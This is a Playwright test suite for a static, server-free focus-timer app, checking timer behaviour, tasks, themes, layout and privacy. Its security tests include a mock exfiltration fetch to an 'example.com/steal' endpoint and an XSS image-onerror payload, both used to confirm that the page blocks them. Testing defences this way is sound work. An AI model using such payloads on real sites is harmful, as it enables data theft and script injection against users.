import { Page, expect, test } from '@playwright/test';

const STORAGE_KEY = 'brew:data-v1';

/**
 * Records anything that would mean the site is broken, or that it talks to something it shouldn't.
 * It's a static site with no server, so it should never make a data request at all.
 */
function watch(page: Page): { problems: string[]; dataRequests: string[]; offsite: string[] } {
  const problems: string[] = [];
  const dataRequests: string[] = [];
  const offsite: string[] = [];
  const origin = new URL(test.info().project.use.baseURL!).origin;
  page.on('pageerror', (e) => problems.push(`page error: ${e.message}`));
  page.on('console', (m) => {
    if (m.type() !== 'error') return;
    // Pages answers a deep link with 404.html and a 404 status. That's how the app boots there,
    // and the browser logs it. A missing file has an extension, so it still counts.
    const deepLink = m.text().includes('404') && !/\.[a-z0-9]+$/i.test(new URL(m.location().url).pathname);
    if (!deepLink) problems.push(`console: ${m.text()} (${m.location().url})`);
  });
  page.on('requestfailed', (r) => problems.push(`failed: ${r.url()}`));
  page.on('response', (r) => {
    if (r.status() >= 400 && !r.request().isNavigationRequest()) problems.push(`${r.status()}: ${r.url()}`);
  });
  page.on('request', (r) => {
    if (['fetch', 'xhr', 'websocket', 'eventsource'].includes(r.resourceType())) dataRequests.push(r.url());
    if (/^https?:/.test(r.url()) && new URL(r.url()).origin !== origin) offsite.push(r.url());
  });
  return { problems, dataRequests, offsite };
}

/** Starts a focus block from the Brew page, skipping the breathing step. */
async function startFocus(page: Page, intention: string): Promise<void> {
  await page.getByRole('button', { name: 'Start', exact: true }).click();
  const dialog = page.locator('app-intention-dialog');
  await dialog.locator('input').first().fill(intention);
  const breathe = dialog.getByRole('checkbox');
  if (await breathe.isChecked()) await breathe.uncheck();
  await dialog.locator('.btn-primary').click();
  await expect(page.getByRole('button', { name: 'Pause' })).toBeVisible();
}

test('it opens straight on the timer, with no sign-in and nothing sent anywhere', async ({ page, context }) => {
  const seen = watch(page);
  const response = await page.goto('./');
  expect(response?.status()).toBe(200);
  await expect(page.locator('.logo-text')).toHaveText('Brew Focus');
  await expect(page.locator('app-timer-stage')).toBeVisible();
  await expect(page.locator('body')).toHaveCSS('font-family', /Outfit/);

  // A first visit starts empty: no sample data, and nothing to sign in to.
  await expect(page.getByText('Nothing planned yet')).toBeVisible();
  await expect(page.locator('input[type=password]')).toHaveCount(0);
  await expect(page.getByText(/sign in|log in/i)).toHaveCount(0);

  await page.getByRole('link', { name: 'Progress' }).click();
  await expect(page.locator('app-heatmap svg')).toBeVisible();

  expect(seen.problems).toEqual([]);
  expect(seen.dataRequests).toEqual([]);
  expect(seen.offsite).toEqual([]);
  expect(await context.cookies()).toEqual([]);
});

test('an old sign-in link just opens the app', async ({ page }) => {
  await page.goto('login');
  await expect(page).toHaveURL(/\/$/);
  await expect(page.locator('app-timer-stage')).toBeVisible();
});

test('a whole block: task, focus, reflection, break, and it shows up on Progress', async ({ page }) => {
  const seen = watch(page);
  await page.clock.install();
  await page.goto('./');

  await page.getByPlaceholder('New task…').fill('Write the report');
  await page.getByRole('button', { name: 'Add' }).click();
  await page.getByRole('button', { name: 'Focus on Write the report' }).click();
  const dialog = page.locator('app-intention-dialog');
  await dialog.locator('input').first().fill('First draft');
  const breathe = dialog.getByRole('checkbox');
  if (await breathe.isChecked()) await breathe.uncheck();
  await dialog.locator('.btn-primary').click();
  await expect(page.locator('.intention')).toContainText('First draft');

  // 25 minutes later: the block is logged, and the reflection prompt opens.
  await page.clock.fastForward('25:00');
  const reflection = page.locator('app-reflection-dialog dialog');
  await expect(reflection).toBeVisible();
  await reflection.locator('textarea').fill('Got the outline done');
  await reflection.locator('.btn-primary').click();

  // The break starts by itself, and the mug refills.
  await expect(page.locator('.phase-chip')).toContainText(/break/i);
  await page.getByRole('button', { name: 'Skip break' }).click();

  await page.getByRole('link', { name: 'Progress' }).click();
  await expect(page.locator('.journal')).toContainText('Got the outline done');
  await expect(page.locator('.journal')).toContainText('First draft');
  await expect(page.locator('.tile').first()).toContainText('25m');

  await page.reload();
  await expect(page.locator('.journal')).toContainText('Got the outline done'); // it was saved
  expect(seen.problems).toEqual([]);
});

test('the timer survives a reload, and pausing holds it', async ({ page }) => {
  await page.goto('./');
  await startFocus(page, 'Stay put');
  await page.reload();
  await expect(page.getByRole('button', { name: 'Pause' })).toBeVisible();
  await expect(page.locator('.intention')).toContainText('Stay put');

  await page.getByRole('button', { name: 'Pause' }).click();
  await expect(page.getByRole('button', { name: 'Start', exact: true })).toBeVisible();
  await page.reload();
  await expect(page.locator('.intention')).toContainText('Stay put');
  await page.getByRole('button', { name: 'Reset' }).click();
});

test('a block that ran out while the tab was closed is credited when you come back', async ({ page }) => {
  await page.goto('./');
  await startFocus(page, 'Went for coffee');
  await page.evaluate((key) => {
    const db = JSON.parse(localStorage.getItem(key)!);
    db.timer.ends_at = new Date(Date.now() - 3_600_000).toISOString(); // it ended an hour ago
    localStorage.setItem(key, JSON.stringify(db));
  }, STORAGE_KEY);
  await page.reload();
  await expect(page.locator('app-reflection-dialog dialog')).toBeVisible();
  await expect(page.locator('app-reflection-dialog dialog')).toContainText('Brew complete');
});

test('every open tab stays in step', async ({ page, context }) => {
  await page.goto('./');
  const other = await context.newPage();
  await other.goto('./');
  await startFocus(page, 'Two tabs');
  await expect(other.getByRole('button', { name: 'Pause' })).toBeVisible();
  await other.getByRole('button', { name: 'Pause' }).click();
  await expect(page.getByRole('button', { name: 'Start', exact: true })).toBeVisible();
});

test('tasks can be added, finished and removed', async ({ page }) => {
  await page.goto('./');
  await page.getByPlaceholder('New task…').fill('Buy coffee beans');
  await page.getByRole('button', { name: 'Add' }).click();
  await page.getByRole('checkbox', { name: 'Mark Buy coffee beans done' }).check();

  // It moves to the folded list of finished tasks, and stays there after a reload.
  const summary = page.locator('app-task-list details summary');
  await expect(summary).toContainText('Done (1)');
  await page.reload();
  await expect(summary).toContainText('Done (1)');
  await summary.click();
  await expect(page.getByRole('checkbox', { name: 'Reopen Buy coffee beans' })).toBeChecked();
  await page.getByRole('button', { name: 'Delete Buy coffee beans' }).click();
  await expect(page.getByText('Buy coffee beans')).toHaveCount(0);
});

test('deep links and reloads work, as Pages serves them', async ({ page }) => {
  const response = await page.goto('progress');
  await expect(page.locator('app-heatmap svg')).toBeVisible();
  expect(response?.ok() || response?.status() === 404).toBe(true); // Pages' 404.html boots the app
  await page.reload();
  await expect(page.locator('app-heatmap svg')).toBeVisible();
});

test('it starts dark, and a switch to light holds across a reload', async ({ page }) => {
  const seen = watch(page);
  const html = page.locator('html');
  await page.emulateMedia({ colorScheme: 'light' }); // the system's preference doesn't decide
  await page.goto('./');
  await expect(html).toHaveAttribute('data-theme', 'dark');
  await expect(page.locator('body')).toHaveCSS('background-color', 'rgb(0, 0, 0)');

  await page.getByRole('button', { name: 'Switch to light mode' }).click();
  await expect(html).toHaveAttribute('data-theme', 'light');
  await expect(page.locator('body')).toHaveCSS('background-color', 'rgb(247, 241, 232)');
  await page.reload();
  await expect(html).toHaveAttribute('data-theme', 'light');

  await page.getByRole('button', { name: 'Switch to dark mode' }).click();
  await expect(html).toHaveAttribute('data-theme', 'dark');
  expect(seen.problems).toEqual([]);
});

test('the theme is set before the app loads, so a light page never flashes dark', async ({ page }) => {
  await page.addInitScript(() => localStorage.setItem('brew:theme', '"light"'));
  await page.route('**/main-*.js', (route) => route.abort()); // no app at all, only the early script
  await page.goto('./', { waitUntil: 'domcontentloaded' });
  await expect(page.locator('html')).toHaveAttribute('data-theme', 'light');
  await expect(page.locator('body')).toHaveCSS('background-color', 'rgb(247, 241, 232)');
});

test('the page policy blocks injected scripts and outside connections', async ({ page }) => {
  await page.goto('./');
  await expect(page.locator('.logo-text')).toHaveText('Brew Focus');
  const policy = await page.locator('meta[http-equiv="Content-Security-Policy"]').getAttribute('content');
  expect(policy).toContain("script-src 'self'");
  expect(policy).not.toContain('unsafe-eval');

  const ran = await page.evaluate(() => {
    const script = document.createElement('script');
    script.textContent = 'window.__injected = true';
    document.body.append(script);
    return (window as unknown as { __injected?: boolean }).__injected ?? false;
  });
  expect(ran).toBe(false);

  const sent = await page.evaluate(() =>
    fetch('https://example.com/steal', { method: 'POST', body: 'data' }).then(
      () => true,
      () => false,
    ),
  );
  expect(sent).toBe(false);
});

test('what you type is shown as text, never run as code', async ({ page }) => {
  const attack = '<img src=x onerror="window.__xss=true">';
  await page.goto('./');
  await page.getByPlaceholder('New task…').fill(attack);
  await page.getByRole('button', { name: 'Add' }).click();
  await expect(page.locator('app-task-list .task-title')).toHaveText(attack);
  await page.reload();
  await expect(page.locator('app-task-list .task-title')).toHaveText(attack);
  await expect(page.locator('app-task-list img')).toHaveCount(0);
  expect(await page.evaluate(() => (window as unknown as { __xss?: boolean }).__xss ?? false)).toBe(false);
});

test('a damaged save can\'t break the page', async ({ page }) => {
  const seen = watch(page);
  await page.addInitScript((key) => localStorage.setItem(key, '{"tasks":"nope","sessions":7'), STORAGE_KEY);
  await page.goto('./');
  await expect(page.locator('app-timer-stage')).toBeVisible();
  await page.getByPlaceholder('New task…').fill('Still works');
  await page.getByRole('button', { name: 'Add' }).click();
  await expect(page.getByText('Still works')).toBeVisible();
  expect(seen.problems).toEqual([]);
});

test('the content uses the whole width of the page, evenly on both sides', async ({ page }) => {
  await page.setViewportSize({ width: 2200, height: 1000 });
  for (const [path, selector] of [['./', 'app-brew-page'], ['progress', 'app-progress-page']]) {
    await page.goto(path);
    const box = await page.locator(selector).boundingBox();
    expect(box).not.toBeNull();
    expect(box!.width).toBeGreaterThan(2200 * 0.9);
    expect(box!.x).toBeCloseTo(2200 - (box!.x + box!.width), 0);
  }
  const overflow = await page.evaluate(() => document.documentElement.scrollWidth - document.documentElement.clientWidth);
  expect(overflow).toBe(0);
});
